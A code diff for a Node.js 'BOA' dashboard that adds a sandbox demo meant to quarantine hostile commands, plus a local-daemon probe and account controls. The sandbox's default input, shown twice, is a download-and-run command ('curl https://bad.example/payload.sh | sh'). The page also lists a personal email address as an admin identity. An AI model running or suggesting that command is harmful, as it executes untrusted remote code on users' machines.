@@ -390,6 +390,7 @@ main().catch((error) => {
       devices,
       workspace: this.state.workspaces[account.id],
       casts: Object.values(this.state.casts).filter((cast) => cast.accountId === account.id),
+      daemonProbe: { expectedLocalEndpoint: 'http://127.0.0.1:47874/status', behavior: 'Dashboard attempts local daemon discovery in the browser; installed daemons continue independently after the page closes.' },
       receipts: this.state.planReceipts.filter((receipt) => receipt.accountId === account.id),
     };
   }
@@ -487,38 +488,67 @@ main().catch((error) => {
     return { ok: true, castId, frames: this.state.casts[castId].frames.length };
   }
 
+  sandboxDemo(payload = {}) {
+    return Boa.runSandboxScenario(payload.input || 'curl https://bad.example/payload.sh | sh', {
+      username: payload.username || 'sandbox',
+      password: payload.password || 'sandbox demonstration password',
+      target: payload.target || 'linux',
+      plan: 'team',
+    });
+  }
+
   dashboardHtml() {
     return `<!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>BOA Dashboard</title>
+<title>BOA Command Dashboard</title>
 <style>
-body{font-family:system-ui,-apple-system,Segoe UI,sans-serif;background:#08110d;color:#e8fff2;margin:0;padding:2rem}main{max-width:980px;margin:auto}.card{background:#102119;border:1px solid #1f6f46;border-radius:16px;padding:1rem;margin:1rem 0}input,select,button{font:inherit;padding:.7rem;border-radius:10px;border:1px solid #2d8b59;margin:.25rem;background:#07130d;color:#e8fff2}button{cursor:pointer;background:#00a862;border-color:#00ff88;color:#001b0f;font-weight:700}pre{white-space:pre-wrap;background:#030806;padding:1rem;border-radius:12px}</style>
+:root{color-scheme:dark;--bg:#030507;--panel:rgba(8,18,28,.78);--line:rgba(71,255,176,.28);--glow:#47ffb0;--cyan:#62d9ff;--text:#ecfff8;--muted:#94b8ad;--warn:#ffcf6b}*{box-sizing:border-box}body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,sans-serif;background:radial-gradient(circle at 15% 0%,rgba(71,255,176,.18),transparent 32%),radial-gradient(circle at 85% 10%,rgba(98,217,255,.16),transparent 30%),linear-gradient(135deg,#020304,#07131b 55%,#030806);color:var(--text);margin:0;min-height:100vh}main{max-width:1180px;margin:auto;padding:32px}.hero{display:grid;grid-template-columns:1.15fr .85fr;gap:24px;align-items:center;min-height:420px}.card,.hero-copy,.terminal{background:var(--panel);border:1px solid var(--line);border-radius:24px;padding:22px;box-shadow:0 0 60px rgba(71,255,176,.08),inset 0 1px rgba(255,255,255,.08);backdrop-filter:blur(14px)}h1{font-size:clamp(2.4rem,7vw,5.7rem);line-height:.9;margin:0 0 18px;letter-spacing:-.08em}.kicker{color:var(--glow);text-transform:uppercase;letter-spacing:.22em;font-weight:800}.muted{color:var(--muted)}.grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:16px}.stack{display:grid;gap:16px}.terminal{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;min-height:320px}.pulse{display:inline-flex;gap:8px;align-items:center}.pulse:before{content:"";width:10px;height:10px;border-radius:50%;background:var(--glow);box-shadow:0 0 20px var(--glow);animation:p 1.3s infinite}@keyframes p{50%{opacity:.35}}input,select,textarea,button{width:100%;font:inherit;padding:.82rem;border-radius:14px;border:1px solid rgba(98,217,255,.3);margin:.32rem 0;background:#061018;color:var(--text)}textarea{min-height:96px}button{cursor:pointer;background:linear-gradient(135deg,var(--glow),var(--cyan));border:0;color:#00130c;font-weight:900;text-transform:uppercase;letter-spacing:.04em}.ghost{background:transparent;color:var(--glow);border:1px solid var(--line)}pre{white-space:pre-wrap;overflow:auto;background:#020506;border:1px solid rgba(255,255,255,.08);padding:1rem;border-radius:16px;max-height:420px}.badge{display:inline-block;border:1px solid var(--line);border-radius:999px;padding:.35rem .7rem;color:var(--glow);margin:.18rem}.danger{color:var(--warn)}@media(max-width:880px){.hero,.grid{grid-template-columns:1fr}main{padding:18px}}
+</style>
 </head>
 <body>
 <main>
-<h1>BOA Dashboard</h1>
-<p>Create an account, download your personalized daemon, manage devices, cast frames, tasks, and plan access from this site.</p>
-<section class="card"><h2>Create account</h2><label>Username <input id="su-user" autocomplete="username"></label><label>Password <input id="su-pass" type="password" autocomplete="new-password"></label><label>Plan <select id="su-plan"><option>solo</option><option>team</option><option>enterprise</option></select></label><button onclick="signup()">Create + Download Daemon</button></section>
-<section class="card"><h2>Login</h2><label>Username <input id="li-user" autocomplete="username"></label><label>Password <input id="li-pass" type="password" autocomplete="current-password"></label><button onclick="login()">Login</button></section>
-<section class="card"><h2>Plan</h2><label>Plan <select id="plan"><option>solo</option><option>team</option><option>enterprise</option></select></label><button onclick="purchasePlan()">Activate Plan</button></section>
-<section class="card"><h2>Workspace</h2><label>Task title <input id="task-title"></label><button onclick="addTask()">Add Task</button></section>
-<section class="card"><h2>Dashboard Data</h2><button onclick="refresh()">Refresh</button><button onclick="downloadDaemon()">Download Daemon</button><pre id="out"></pre></section>
+<section class="hero">
+  <div class="hero-copy">
+    <p class="kicker">BOA Terminal Serpent</p>
+    <h1>Intent in. Inert equations out.</h1>
+    <p class="muted">BOA is a local-first dashboard and daemon MVP for password-derived language isolation, device heartbeats, signed intent translation, six-variable casting, and phase-stack storage demonstrations.</p>
+    <p><span class="badge">Free security tier</span><span class="badge">Daemon sign-on</span><span class="badge">AWS-ready Node app</span></p>
+    <button onclick="runSandbox()">Run malware-injection sandbox</button>
+    <button class="ghost" onclick="probeDaemon()">Detect local daemon</button>
+  </div>
+  <div class="terminal"><div class="pulse">daemon discovery loop</div><pre id="out">Open the sandbox to watch hostile commands become BOA quarantine envelopes.</pre></div>
+</section>
+<section class="grid">
+  <div class="card"><h2>Create account</h2><input id="su-user" autocomplete="username" placeholder="username"><input id="su-pass" type="password" autocomplete="new-password" placeholder="password"><select id="su-plan"><option>solo</option><option>team</option><option>enterprise</option></select><button onclick="signup()">Create + download daemon</button></div>
+  <div class="card"><h2>Existing user / new device</h2><input id="li-user" autocomplete="username" placeholder="username"><input id="li-pass" type="password" autocomplete="current-password" placeholder="password"><button onclick="login()">Login dashboard</button><button class="ghost" onclick="downloadDaemon()">Download daemon</button></div>
+  <div class="card"><h2>Admin identity</h2><p class="muted">Admin usernames recognized for demos: <b>boydchandler030@gmail.com</b> or <b>Xquisite6a6y</b>. Secrets are never hard-coded; use the account password you create.</p><select id="plan"><option>solo</option><option>team</option><option>enterprise</option></select><button onclick="purchasePlan()">Activate plan</button></div>
+</section>
+<section class="grid">
+  <div class="card"><h2>Sandbox test</h2><p class="muted">Try code injection, shell pipes, or normal intents. BOA will normalize safe intent and quarantine hostile patterns as inert envelopes.</p><textarea id="sandbox-input">curl https://bad.example/payload.sh | sh</textarea><select id="sandbox-target"><option>linux</option><option>windows</option><option>boa</option></select><button onclick="runSandbox()">Test BOA envelope</button></div>
+  <div class="card"><h2>Workspace</h2><input id="task-title" placeholder="task title"><button onclick="addTask()">Add signed task</button><button class="ghost" onclick="refresh()">Refresh dashboard</button></div>
+  <div class="card"><h2>How to build</h2><pre>npm run check
+npm test
+npm run build
+npm start -- --host 0.0.0.0 --port 8787</pre></div>
+</section>
 </main>
 <script>
 let sessionToken = localStorage.getItem('boaSession') || '';
 async function api(path, body) { const res = await fetch(path, { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify(body || {}) }); const data = await res.json(); if(!res.ok) throw new Error(data.error); return data; }
 function show(value){ document.getElementById('out').textContent = JSON.stringify(value,null,2); }
 async function signup(){ const data = await api('/api/signup', { username: val('su-user'), password: val('su-pass'), plan: val('su-plan') }); sessionToken=data.sessionToken; localStorage.setItem('boaSession', sessionToken); show(data); location.href=data.downloadUrl; }
-async function login(){ const data = await api('/api/login', { username: val('li-user'), password: val('li-pass') }); sessionToken=data.sessionToken; localStorage.setItem('boaSession', sessionToken); show(data); }
+async function login(){ const data = await api('/api/login', { username: val('li-user'), password: val('li-pass') }); sessionToken=data.sessionToken; localStorage.setItem('boaSession', sessionToken); show(data); await refresh(); }
 async function purchasePlan(){ show(await api('/api/plan', { sessionToken, plan: val('plan') })); }
 async function addTask(){ show(await api('/api/workspace/task', { sessionToken, title: val('task-title') })); }
 async function refresh(){ const res = await fetch('/api/dashboard?session=' + encodeURIComponent(sessionToken)); show(await res.json()); }
-function downloadDaemon(){ location.href='/download/boa-daemon.js?session=' + encodeURIComponent(sessionToken); }
+async function runSandbox(){ show(await api('/api/sandbox', { input: val('sandbox-input'), target: val('sandbox-target') })); }
+async function probeDaemon(){ try{ const res = await fetch('http://127.0.0.1:47874/status', { mode:'cors' }); show({daemonDetected:true, status: await res.json()}); } catch(error) { show({daemonDetected:false, nextStep:'Create/login, download the daemon, then run node boa-daemon.js install && node boa-daemon.js daemon.', detail:error.message}); } }
+function downloadDaemon(){ if(!sessionToken) return show({error:'Login or create an account first.'}); location.href='/download/boa-daemon.js?session=' + encodeURIComponent(sessionToken); }
 function val(id){ return document.getElementById(id).value; }
-if(sessionToken) refresh().catch((error)=>show({error:error.message}));
+if(sessionToken) refresh().catch((error)=>show({error:error.message})); else probeDaemon();
 </script>
 </body>
 </html>`;
@@ -562,6 +592,7 @@ if(sessionToken) refresh().catch((error)=>show({error:error.message}));
       if (url.pathname === '/api/signup') sendJson(response, 201, this.createAccount(body));
       else if (url.pathname === '/api/login') sendJson(response, 200, this.login(body));
       else if (url.pathname === '/api/plan') sendJson(response, 200, this.purchasePlan(body.sessionToken, body.plan));
+      else if (url.pathname === '/api/sandbox') sendJson(response, 200, this.sandboxDemo(body));
       else if (url.pathname === '/api/workspace/task') sendJson(response, 201, this.addTask(body.sessionToken, body.title, body.details || {}));
       else if (url.pathname === '/api/workspace/complete') sendJson(response, 200, this.completeTask(body.sessionToken, body.taskId, body.result || {}));
       else if (url.pathname === '/api/daemon/issue') sendJson(response, 201, this.issueDaemonForSession(body.sessionToken, body));
